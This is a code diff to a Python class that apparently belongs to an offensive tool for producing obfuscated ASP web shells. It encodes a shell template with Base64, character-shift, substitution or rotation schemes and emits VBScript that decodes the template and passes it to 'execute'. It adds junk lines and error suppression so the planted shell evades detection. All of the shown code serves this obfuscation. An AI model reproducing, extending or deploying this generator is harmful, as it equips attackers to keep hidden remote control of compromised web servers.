@@ -42,41 +42,38 @@ class Asp(Shell):
 		self.shell_path = self.Path.asp if path == None else path
 		self.shell_text = self.Read(self.shell_path)
 	
+	def Encode(self, encoding): 
+		self.encoding = encoding
+		if encoding == 'b64' : return self.Base64()
+		if encoding == 'ord' : return self.OrdPlus()
+		if encoding == 'rnd' : return self.Random()
+		if encoding == 'rot' : return self.RotPlus()
+	
 	def Create(self, payload, add_junk = False): 
-		shell = payload + 'execute ' + self.vars[-1] + ' \n'
-		if add_junk : shell = ''.join(line + ' \n' + Junk().Asp([ self.makeVars() for _ in range(4) ])[self.rndInt(1, 4)] + '\n' for line in shell.split(' \n') if line.strip() != '' )
+		shell = payload + '\nexecute ' + self.vars[-1] + ' \n'
+		if add_junk and self.encoding != 'b64' : 
+			shell = ''.join( 
+				line + ' \n' + Junk().Asp([ self.makeVars() for _ in range(4) ])[self.rndInt(1, 4)] + '\n' 
+				for line in shell.split(' \n') if line.strip() != '' 
+			)
 		shell = '<% \non error resume next \n' + shell +  '%>' 
 		return shell
 	
-	def Executable(self, shell_data): 
-		strings = lambda string : string.replace('"', '""').replace('<%', '< %').replace('%>', '% >')
-		parser = AspParser(shell_data) 
-		parts = parser.getParts() 
-		asp = { part : parser.stripTags(part) for part in parts['asp'] }
-		asp = { part : 'response.write ' + asp[part].strip()[1:] + ' ' if asp[part].strip()[:1] == '=' else asp[part] for part in asp }
-		html = { h : 'response.write ' + ' & '.join([ '"' + strings(l) + '"' for l in h.split('\n') if l.strip() != '' ]) for h in parts['html'] }
-		
-		shell_txt = parser.stripHead()
-		for h in html : shell_txt = re.sub('((^|(?<=%>))' + re.escape(h) + '(?=(<%|$)))', '\n' + html[h] + '\n', shell_txt)
-		for a in asp : shell_txt = shell_txt.replace(a, asp[a])
-		return shell_txt
-	
-	def Base64(self, add_junk = False): 
+	def Base64(self): 
 		shell_encoded = Encoders(self.Executable(self.shell_text)).Base64()
 		junk = self.makeJunk(shell_encoded , self.an_chars) 
 		vals = self.makeVals(shell_encoded, junk)
-		self.vars += [ self.makeVars() for _ in range(3) ]
+		self.vars += [ self.makeVars() for _ in range(4) ]
 		
-		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ' \n' 
+		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ', ' + self.vars[3] + ' \n' 
 		payload += self.vars[0] + ' = "" \n' 
 		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vals[i] + '" \n' for i in range(len(vals))]) 
 		payload += VBS_B64 + ' \nset ' + self.vars[1] + ' = new Base64 \n'
-		payload += self.vars[2] + ' = ' + self.vars[1] + '.Decode( ' + self.vars[0] + ' ) \n'
-		
-		shell = self.Create(payload, False)
-		return shell 
+		payload += self.vars[2] + ' = Replace( ' + self.vars[0] + ', "' + junk + '", "") \n' 
+		payload += self.vars[3] + ' = ' + self.vars[1] + '.Decode( ' + self.vars[2] + ' ) \n'
+		return payload
 	
-	def OrdPlus(self, add_junk = False): 
+	def OrdPlus(self): 
 		shell_encoded, ord_plus, chr_join = Encoders(self.Executable(self.shell_text)).OrdPlus()
 		vals = self.makeVals(shell_encoded)
 		self.vars = [ self.makeVars() for _ in range(3) ]
@@ -85,13 +82,12 @@ class Asp(Shell):
 		payload += self.vars[2] + ' = "" \n' 
 		payload += self.vars[0] + ' = "" \n' 
 		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vals[i] + '" \n' for i in range(len(vals)) ]) 
-		payload += 'for each ' + self.vars[1] + ' in split(' + self.vars[0] + ', "' + chr_join + '") : ' + self.vars[2] + ' = ' + self.vars[2] + ' & chr(' + self.vars[1] + ' - ' + str(ord_plus) + ') : next \n' 
-		
-		shell = self.Create(payload, add_junk) 
-		return shell 
+		payload += 'for each ' + self.vars[1] + ' in split(' + self.vars[0] + ', "' + chr_join + '") : ' 
+		payload += self.vars[2] + ' = ' + self.vars[2] + ' & chr(' + self.vars[1] + ' - ' + str(ord_plus) + ') : next \n' 
+		return payload
 	
-	def Random(self, add_junk = False): 
-		vbSpecialChars = lambda string : string.replace('"', '""').replace('\\\\', '\\').replace('\\n', '" & chr(10) & "').replace('\\t', '" & chr(9) & "')
+	def Random(self): 
+		vbSpecialChars = lambda s : s.replace('"', '""').replace('\\\\', '\\').replace('\\n', '" & chr(10) & "').replace('\\t', '" & chr(9) & "')
 		shell_encoded, cs1, cs2 = Encoders(self.Executable(self.shell_text)).Random()		
 		vals = self.makeVals(shell_encoded)
 		self.vars = [ self.makeVars() for _ in range(4) ]
@@ -99,19 +95,22 @@ class Asp(Shell):
 		payload = 'dim ' + self.vars[0] + ', ' + self.vars[1] + ', ' + self.vars[2] + ', ' + self.vars[3] + ' \n' 
 		payload += self.vars[3] + ' = "" \n' 
 		payload += self.vars[0] + ' = "" \n' 
-		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vbSpecialChars(vals[i].encode('unicode-escape')) + '" \n' for i in range(len(vals)) ]) 
+		payload += ''.join([ 
+			self.vars[0] + ' = ' + self.vars[0] + ' & "' + vbSpecialChars(vals[i].encode('unicode-escape')) + '" \n' 
+			for i in range(len(vals)) 
+		]) 
 		payload += self.vars[1] + ' = "' + vbSpecialChars(cs2.encode('unicode-escape')) + '" \n' 
 		payload += self.vars[2] + ' = "' + vbSpecialChars(cs1.encode('unicode-escape')) + '" \n' 
 		payload += 'for i = 1 to len(' + self.vars[0] + ') \n' 
-		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) > 0 then ' + self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[2] + ', instr(1, ' + self.vars[1] + ', mid(' + self.vars[0] + ', i, 1)), 1) \n' 
-		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) = 0 then ' + self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[0] + ', i, 1) \n' 
+		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) > 0 then ' 
+		payload += self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[2] + ', instr(1, ' + self.vars[1] + ', mid(' + self.vars[0] + ', i, 1)), 1) \n' 
+		payload += 'if instr(1, ' + self.vars[2] + ', mid(' + self.vars[0] + ', i, 1)) = 0 then ' 
+		payload += self.vars[3] + ' = ' + self.vars[3] + ' & mid(' + self.vars[0] + ', i, 1) \n' 
 		payload += 'next \n' 
-		
-		shell = self.Create(payload, add_junk) 
-		return shell
+		return payload
 	
-	def RotPlus(self, add_junk = False): 
-		vbSpecialChars = lambda string : string.replace('"', '""').replace('\n', '" & chr(10) & "').replace('\t', '" & chr(9) & "')
+	def RotPlus(self): 
+		vbSpecialChars = lambda s : s.replace('"', '""').replace('\n', '" & chr(10) & "').replace('\t', '" & chr(9) & "')
 		shell_encoded, rows = Encoders(self.Executable(self.shell_text)).Rot90()
 		vals = self.makeVals(shell_encoded)
 		self.vars = [ self.makeVars() for _ in range(4) ]
@@ -121,10 +120,28 @@ class Asp(Shell):
 		payload += self.vars[0] + ' = "" \n' 
 		payload += ''.join([ self.vars[0] + ' = ' + self.vars[0] + ' & "' + vbSpecialChars(vals[i]) + '" \n' for i in range(len(vals)) ]) 
 		payload += 'for i = 0 to (len(' + self.vars[0] + ') / ' + self.vars[1] + ') - 1 \n' 
-		payload += 'for r = 1 to ' + self.vars[1] + ' : ' + self.vars[2] + '(r) = ' + self.vars[2] + '(r) & mid(' + self.vars[0] + ', r + i * ' + self.vars[1] + ', 1) : next \n'
+		payload += 'for r = 1 to ' + self.vars[1] + ' : ' 
+		payload += self.vars[2] + '(r) = ' + self.vars[2] + '(r) & mid(' + self.vars[0] + ', r + i * ' + self.vars[1] + ', 1) : next \n'
 		payload += 'next \n' 
 		payload += self.vars[3] + ' = trim(join(' + self.vars[2] + ', "")) \n' 
-		
-		shell = self.Create(payload, add_junk) 
-		return shell
+		return payload
+	
+	def Executable(self, shell_data): 
+		strings = lambda string : string.replace('"', '""').replace('<%', '< %').replace('%>', '% >')
+		parser = AspParser(shell_data) 
+		parts = parser.getParts() 
+		asp = { part : parser.stripTags(part) for part in parts['asp'] }
+		asp = { 
+			part : 'response.write ' + asp[part].strip()[1:] + ' ' if asp[part].strip()[:1] == '=' else asp[part] 
+			for part in asp 
+		}
+		html = { 
+			h : 'response.write ' + ' & '.join([ '"' + strings(l) + '"' for l in h.split('\n') if l.strip() != '' ]) 
+			for h in parts['html'] 
+		}
+		shell_txt = parser.stripHead()
+		for h in html : shell_txt = re.sub('((^|(?<=%>))' + re.escape(h) + '(?=(<%|$)))', '\n' + html[h] + '\n', shell_txt)
+		for a in asp : shell_txt = shell_txt.replace(a, asp[a])
+		return shell_txt
+
 
